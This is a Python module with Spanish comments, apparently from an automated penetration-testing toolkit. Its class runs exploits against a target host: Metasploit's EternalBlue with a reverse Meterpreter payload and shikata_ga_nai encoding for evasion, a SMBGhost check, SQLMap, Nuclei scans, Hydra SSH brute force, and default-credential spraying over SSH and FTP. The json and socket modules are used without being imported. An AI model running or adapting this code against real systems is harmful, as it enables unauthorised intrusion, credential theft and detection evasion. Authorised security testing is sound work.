#!/usr/bin/env python3

import logging
import subprocess
import os
import time
import paramiko
from typing import Dict, List
from pymetasploit3.msfrpc import MsfRpcClient

logger = logging.getLogger(__name__)

class ServiceExploits:
    def __init__(self, msf_client: MsfRpcClient, config: Dict):
        """Inicializa el módulo de explotación de servicios"""
        self.msf_client = msf_client
        self.config = config
        self.temp_dir = os.path.join(os.path.dirname(__file__), "..", "..", "temp")
        os.makedirs(self.temp_dir, exist_ok=True)
    
    def run_metasploit(self, target: str, port: int, service: str, version: str) -> Dict:
        """Ejecuta módulos de Metasploit para el servicio especificado"""
        result = {
            "exploits": [],
            "vulnerabilities": []
        }
        
        try:
            if not self.msf_client:
                return result
                
            # Obtener módulos relevantes para el servicio
            modules = self.config.get("tools", {}).get("metasploit", {}).get("modules", {}).get(service, [])
            
            for module in modules:
                try:
                    # Crear archivo de comandos para msfconsole
                    msf_commands = f"""
                    use {module}
                    set RHOSTS {target}
                    set RPORT {port}
                    run
                    exit
                    """
                    
                    msf_file = os.path.join(self.temp_dir, f"msf_{target}_{port}_{module.replace('/', '_')}.rc")
                    with open(msf_file, 'w') as f:
                        f.write(msf_commands)
                    
                    # Ejecutar msfconsole
                    cmd = f"msfconsole -r {msf_file}"
                    process = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    
                    # Procesar resultados
                    if process.stdout:
                        result["exploits"].append({
                            "tool": "metasploit",
                            "module": module,
                            "output": process.stdout
                        })
                        
                        # Verificar si se obtuvo una sesión
                        if "Meterpreter session" in process.stdout:
                            session_id = self._extract_session_id(process.stdout)
                            if session_id:
                                return {
                                    "success": True,
                                    "session_id": session_id,
                                    "type": "meterpreter",
                                    "details": process.stdout
                                }
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error al ejecutar Metasploit: {str(e)}")
        
        return result
    
    def run_nuclei(self, target: str, port: int, service: str) -> Dict:
        """Ejecuta Nuclei para el servicio especificado"""
        result = {
            "exploits": [],
            "vulnerabilities": []
        }
        
        try:
            # Construir URL objetivo
            protocol = "https" if service in ["https", "ssl"] else "http"
            target_url = f"{protocol}://{target}:{port}"
            
            # Obtener templates y severidad de la configuración
            nuclei_config = self.config.get("tools", {}).get("nuclei", {})
            templates = nuclei_config.get("templates", ["cves", "vulnerabilities"])
            severity = nuclei_config.get("severity", ["critical", "high", "medium", "low"])
            
            # Ejecutar Nuclei
            cmd = [
                "nuclei",
                "-u", target_url,
                "-t", ",".join(templates),
                "-severity", ",".join(severity),
                "-silent",
                "-json",
                "-o", os.path.join(self.temp_dir, f"nuclei_{target}_{port}.json")
            ]
            
            process = subprocess.run(cmd, capture_output=True, text=True)
            
            # Procesar resultados
            nuclei_file = os.path.join(self.temp_dir, f"nuclei_{target}_{port}.json")
            if os.path.exists(nuclei_file):
                with open(nuclei_file, 'r') as f:
                    for line in f:
                        try:
                            vuln = json.loads(line)
                            result["vulnerabilities"].append(vuln)
                        except json.JSONDecodeError:
                            continue
        
        except Exception as e:
            logger.error(f"Error al ejecutar Nuclei: {str(e)}")
        
        return result
    
    def run_sqlmap(self, target: str, port: int, service: str) -> Dict:
        """Ejecuta SQLMap para el servicio especificado"""
        result = {
            "exploits": [],
            "vulnerabilities": []
        }
        
        try:
            # Construir URL objetivo
            protocol = "https" if service in ["https", "ssl"] else "http"
            target_url = f"{protocol}://{target}:{port}"
            
            # Obtener configuración de SQLMap
            sqlmap_config = self.config.get("tools", {}).get("sqlmap", {})
            level = sqlmap_config.get("level", 1)
            risk = sqlmap_config.get("risk", 1)
            techniques = sqlmap_config.get("techniques", ["BEUSTQ"])
            
            # Ejecutar SQLMap
            cmd = [
                "sqlmap",
                "-u", target_url,
                "--batch",
                "--random-agent",
                "--level", str(level),
                "--risk", str(risk),
                "--technique", "".join(techniques),
                "--output-dir", os.path.join(self.temp_dir, f"sqlmap_{target}_{port}")
            ]
            
            process = subprocess.run(cmd, capture_output=True, text=True)
            
            # Procesar resultados
            if process.stdout:
                result["exploits"].append({
                    "tool": "sqlmap",
                    "target": target_url,
                    "output": process.stdout
                })
        
        except Exception as e:
            logger.error(f"Error al ejecutar SQLMap: {str(e)}")
        
        return result
    
    def exploit_smb(self, target: str, port: int) -> Dict:
        """Explotación específica para SMB"""
        result = {
            "exploits": [],
            "vulnerabilities": []
        }
        
        try:
            # EternalBlue check
            cmd = f"python3 /opt/MS17-010/checker.py {target}"
            check_result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if "VULNERABLE" in check_result.stdout:
                result["vulnerabilities"].append({
                    "name": "MS17-010",
                    "severity": "critical",
                    "description": "EternalBlue vulnerability detected",
                    "details": check_result.stdout
                })
                
                # Intentar exploit si está habilitado
                if self.config.get("exploit_modules", {}).get("windows", {}).get("ms17_010", {}).get("enabled", False):
                    payload = self.config["exploit_modules"]["windows"]["ms17_010"]["payload"]
                    exploit_result = self._run_msf_exploit(target, port, "exploit/windows/smb/ms17_010_eternalblue", payload)
                    if exploit_result.get("success", False):
                        result["exploits"].append(exploit_result)
            
            # SMBGhost check
            cmd = f"python3 /opt/SMBGhost/scanner.py {target}"
            check_result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if "VULNERABLE" in check_result.stdout:
                result["vulnerabilities"].append({
                    "name": "CVE-2020-0796",
                    "severity": "critical",
                    "description": "SMBGhost vulnerability detected",
                    "details": check_result.stdout
                })
            
            # Null session enumeration
            cmd = f"smbclient -L //{target} -N"
            null_result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=30)
            if "Sharename" in null_result.stdout:
                result["exploits"].append({
                    "tool": "smbclient",
                    "method": "null_session",
                    "output": null_result.stdout
                })
        
        except Exception as e:
            logger.error(f"Error en explotación SMB: {str(e)}")
        
        return result
    
    def exploit_ssh(self, target: str, port: int) -> Dict:
        """Explotación específica para SSH"""
        result = {
            "exploits": [],
            "vulnerabilities": []
        }
        
        try:
            # Obtener versión de SSH
            cmd = f"nc -v {target} {port}"
            version_result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=10)
            
            if version_result.stdout:
                result["vulnerabilities"].append({
                    "name": "SSH Version",
                    "severity": "info",
                    "description": "SSH version information",
                    "details": version_result.stdout
                })
            
            # Probar credenciales por defecto
            default_users = self.config.get("credentials", {}).get("default_users", [])
            default_passwords = self.config.get("credentials", {}).get("default_passwords", [])
            
            for user in default_users:
                for password in default_passwords:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target, port=port, username=user, password=password, timeout=5)
                        result["exploits"].append({
                            "tool": "ssh",
                            "method": "default_credentials",
                            "credentials": f"{user}:{password}",
                            "output": "Default credentials successful"
                        })
                        ssh.close()
                        break
                    except:
                        continue
            
            # Intentar bruteforce si está habilitado
            if self.config.get("exploitation", {}).get("methods", {}).get("bruteforce", {}).get("enabled", False):
                wordlist = self.config.get("exploit_modules", {}).get("linux", {}).get("ssh_bruteforce", {}).get("wordlist", "/usr/share/wordlists/rockyou.txt")
                threads = self.config["exploit_modules"]["linux"]["ssh_bruteforce"]["threads"]
                
                cmd = [
                    "hydra",
                    "-L", wordlist,
                    "-P", wordlist,
                    "-t", str(threads),
                    "-V",
                    "-f",
                    "ssh://" + target
                ]
                
                process = subprocess.run(cmd, capture_output=True, text=True)
                if "login:" in process.stdout:
                    result["exploits"].append({
                        "tool": "hydra",
                        "method": "bruteforce",
                        "output": process.stdout
                    })
        
        except Exception as e:
            logger.error(f"Error en explotación SSH: {str(e)}")
        
        return result
    
    def exploit_ftp(self, target: str, port: int) -> Dict:
        """Explotación específica para FTP"""
        result = {
            "exploits": [],
            "vulnerabilities": []
        }
        
        try:
            # Probar acceso anónimo
            cmd = f"ftp -n {target} {port}"
            ftp_commands = "user anonymous\npass anonymous\nls\nquit\n"
            
            process = subprocess.Popen(cmd.split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate(input=ftp_commands)
            
            if "230" in stdout:
                result["exploits"].append({
                    "tool": "ftp",
                    "method": "anonymous_access",
                    "output": stdout
                })
            
            # Probar credenciales por defecto
            default_users = self.config.get("credentials", {}).get("default_users", [])
            default_passwords = self.config.get("credentials", {}).get("default_passwords", [])
            
            for user in default_users:
                for password in default_passwords:
                    try:
                        cmd = f"ftp -n {target} {port}"
                        ftp_commands = f"user {user}\npass {password}\nls\nquit\n"
                        
                        process = subprocess.Popen(cmd.split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                        stdout, stderr = process.communicate(input=ftp_commands)
                        
                        if "230" in stdout:
                            result["exploits"].append({
                                "tool": "ftp",
                                "method": "default_credentials",
                                "credentials": f"{user}:{password}",
                                "output": stdout
                            })
                            break
                    except:
                        continue
        
        except Exception as e:
            logger.error(f"Error en explotación FTP: {str(e)}")
        
        return result
    
    def _run_msf_exploit(self, target: str, port: int, module: str, payload: str) -> Dict:
        """Ejecuta un exploit específico de Metasploit"""
        result = {
            "success": False,
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Configurar exploit
            exploit = self.msf_client.modules.use('exploit', module)
            exploit['RHOSTS'] = target
            exploit['RPORT'] = port
            
            # Configurar payload
            payload_obj = self.msf_client.modules.use('payload', payload)
            payload_obj['LHOST'] = self._get_local_ip()
            payload_obj['LPORT'] = 4444
            
            # Aplicar técnicas de evasión
            if "payload_encoding" in self.config.get("evasion_techniques", []):
                payload_obj['EnableStageEncoding'] = True
                payload_obj['StageEncoder'] = 'x86/shikata_ga_nai'
            
            # Ejecutar exploit
            exploit.execute(payload=payload_obj)
            
            # Esperar sesión
            time.sleep(10)
            sessions = self.msf_client.sessions.list
            
            if sessions:
                session_id = list(sessions.keys())[-1]
                result.update({
                    "success": True,
                    "details": f"Session {session_id} established",
                    "session_id": session_id
                })
        
        except Exception as e:
            logger.error(f"Error al ejecutar exploit {module}: {str(e)}")
        
        return result
    
    def _get_local_ip(self) -> str:
        """Obtiene la IP local para payloads"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _extract_session_id(self, output: str) -> str:
        """Extrae el ID de sesión de la salida de Metasploit"""
        try:
            import re
            match = re.search(r"Meterpreter session (\d+)", output)
            if match:
                return match.group(1)
        except:
            pass
        return None 